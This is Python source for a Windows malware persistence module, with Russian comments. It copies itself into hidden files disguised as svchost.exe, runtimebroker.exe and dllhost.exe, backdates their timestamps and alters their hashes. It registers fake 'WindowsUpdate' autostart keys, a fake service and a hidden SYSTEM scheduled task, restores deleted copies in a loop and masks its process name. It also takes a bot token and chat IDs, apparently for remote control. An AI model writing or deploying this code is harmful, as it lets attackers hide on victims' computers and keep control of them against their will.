import os
import sys
import time
import random
import subprocess
import ctypes
import winreg
import psutil
import platform
import threading
from pathlib import Path

HIDDEN_COPIES = {
    "svchost.exe": {
        "path": os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Update"),
        "autostart": True,
        "hidden": True,
        "service": True,
        "scheduler": True
    },
    "runtimebroker.exe": {
        "path": os.path.join(os.getenv('PROGRAMDATA'), "Microsoft", "Network"),
        "hidden": True,
        "registry": True
    },
    "dllhost.exe": {
        "path": os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Credentials"),
        "hidden": True,
        "task": True
    }
}

CHECK_INTERVAL = 180  # 3 минуты между проверками
FILE_LOCK_RETRIES = 3

def initialize(bot_token, chat_ids, device_name):
    global BOT_TOKEN, CHAT_IDS, DEVICE_NAME
    BOT_TOKEN = bot_token
    CHAT_IDS = chat_ids
    DEVICE_NAME = device_name

def hide_file(filepath):
    """Скрытие файла в Windows с несколькими попытками"""
    for _ in range(FILE_LOCK_RETRIES):
        try:
            if platform.system() == 'Windows':
                ctypes.windll.kernel32.SetFileAttributesW(filepath, 2)  # FILE_ATTRIBUTE_HIDDEN
                return True
            time.sleep(1)
        except:
            time.sleep(1)
    return False

def lock_file(filepath):
    """Блокировка файла от удаления"""
    try:
        if platform.system() == 'Windows':
            ctypes.windll.kernel32.SetFileAttributesW(filepath, 2 | 4 | 1)
            return True
    except:
        pass
    return False

def set_file_time(filepath):
    """Устанавливает время файла как у системных файлов"""
    try:
        sysfile = "C:\\Windows\\System32\\kernel32.dll"
        st = os.stat(sysfile)
        os.utime(filepath, (st.st_atime, st.st_mtime))
    except:
        pass

def register_autostart(target_path):
    """Регистрация в автозагрузке с использованием неочевидного имени"""
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, target_path)
        
        subkeys = [
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
            r"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
        ]
        
        for sk in subkeys:
            try:
                with winreg.OpenKey(key, sk, 0, winreg.KEY_WRITE) as regkey:
                    winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, target_path)
            except:
                pass
        
        return True
    except:
        return False

def create_windows_service(service_name, display_name, target_path):
    """Создание службы Windows"""
    try:
        sc_path = os.path.join(os.getenv('SYSTEMROOT'), 'System32', 'sc.exe')
        subprocess.run([
            sc_path, 'create', service_name,
            'binPath=', target_path,
            'DisplayName=', display_name,
            'start=', 'auto'
        ], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        subprocess.run([
            sc_path, 'description', service_name,
            "Windows Update Service"
        ], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
    except:
        return False

def create_scheduled_task(task_name, target_path):
    """Создание задачи в планировщике"""
    try:
        xml_template = f"""
        <?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <RegistrationInfo>
            <Description>Windows Update Task</Description>
          </RegistrationInfo>
          <Triggers>
            <LogonTrigger>
              <Enabled>true</Enabled>
            </LogonTrigger>
            <SessionStateChangeTrigger>
              <Enabled>true</Enabled>
              <StateChange>SessionUnlock</StateChange>
            </SessionStateChangeTrigger>
            <CalendarTrigger>
              <StartBoundary>2015-01-01T08:00:00</StartBoundary>
              <Enabled>true</Enabled>
              <ScheduleByDay>
                <DaysInterval>1</DaysInterval>
              </ScheduleByDay>
            </CalendarTrigger>
          </Triggers>
          <Principals>
            <Principal id="Author">
              <UserId>S-1-5-18</UserId>
              <RunLevel>HighestAvailable</RunLevel>
            </Principal>
          </Principals>
          <Settings>
            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
            <AllowHardTerminate>false</AllowHardTerminate>
            <StartWhenAvailable>true</StartWhenAvailable>
            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
            <IdleSettings>
              <StopOnIdleEnd>false</StopOnIdleEnd>
              <RestartOnIdle>false</RestartOnIdle>
            </IdleSettings>
            <AllowStartOnDemand>true</AllowStartOnDemand>
            <Enabled>true</Enabled>
            <Hidden>true</Hidden>
            <RunOnlyIfIdle>false</RunOnlyIfIdle>
            <WakeToRun>false</WakeToRun>
            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
            <Priority>7</Priority>
          </Settings>
          <Actions Context="Author">
            <Exec>
              <Command>"{target_path}"</Command>
            </Exec>
          </Actions>
        </Task>
        """
        
        xml_path = os.path.join(os.getenv('TEMP'), f"{task_name}.xml")
        with open(xml_path, 'w') as f:
            f.write(xml_template)
            
        subprocess.run([
            'schtasks.exe', '/Create', '/TN', task_name,
            '/XML', xml_path, '/F'
        ], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        os.remove(xml_path)
        return True
    except:
        return False

def create_hidden_copies():
    """Создание скрытых копий программы с уникальными характеристиками"""
    current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    
    for filename, config in HIDDEN_COPIES.items():
        try:
            os.makedirs(config["path"], exist_ok=True)
            target_path = os.path.join(config["path"], filename)
            
            if os.path.exists(target_path):
                continue
                
            with open(current_exe, "rb") as src, open(target_path, "wb") as dst:
                dst.write(src.read())
                dst.write(os.urandom(random.randint(100, 1000)))
            
            if config.get("hidden", False):
                hide_file(target_path)
                set_file_time(target_path)
                lock_file(target_path)
            
            if config.get("autostart", False):
                register_autostart(target_path)
            
            if config.get("service", False):
                create_windows_service(
                    f"WinUpdate_{random.randint(1000,9999)}",
                    "Windows Update Service",
                    target_path
                )
            
            if config.get("scheduler", False):
                create_scheduled_task(
                    f"WindowsUpdateTask_{random.randint(1000,9999)}",
                    target_path
                )
            
            if config.get("registry", False):
                register_autostart(target_path)
                
            subprocess.Popen([target_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
                
        except Exception as e:
            print(f"Ошибка создания скрытой копии {filename}: {e}")

def check_and_repair():
    """Проверка и восстановление скрытых копий"""
    current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    
    while True:
        try:
            for filename, config in HIDDEN_COPIES.items():
                target_path = os.path.join(config["path"], filename)
                
                if not os.path.exists(target_path):
                    print(f"Восстанавливаю удаленный файл: {target_path}")
                    create_hidden_copies()
                    break
                    
                running = False
                for proc in psutil.process_iter(['name', 'exe']):
                    if proc.info['name'].lower() == filename.lower() or \
                       (proc.info['exe'] and proc.info['exe'].lower() == target_path.lower()):
                        running = True
                        break
                        
                if not running:
                    print(f"Запускаю процесс: {target_path}")
                    subprocess.Popen(
                        [target_path], 
                        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                        stdin=subprocess.DEVNULL,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    
        except Exception as e:
            print(f"Ошибка мониторинга: {e}")
        
        time.sleep(CHECK_INTERVAL)

def hide_process():
    """Попытка скрыть процесс в диспетчере задач"""
    if platform.system() == 'Windows':
        try:
            ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            kernel32.SetConsoleTitleA(b"svchost.exe")
            user32 = ctypes.WinDLL('user32', use_last_error=True)
            user32.SetWindowTextA(kernel32.GetConsoleWindow(), b"svchost.exe")
        except:
            pass

def protect_process():
    """Защита процесса от завершения"""
    if platform.system() == 'Windows':
        try:
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            kernel32.SetProcessShutdownParameters(0x4FF, 0)
        except:
            pass
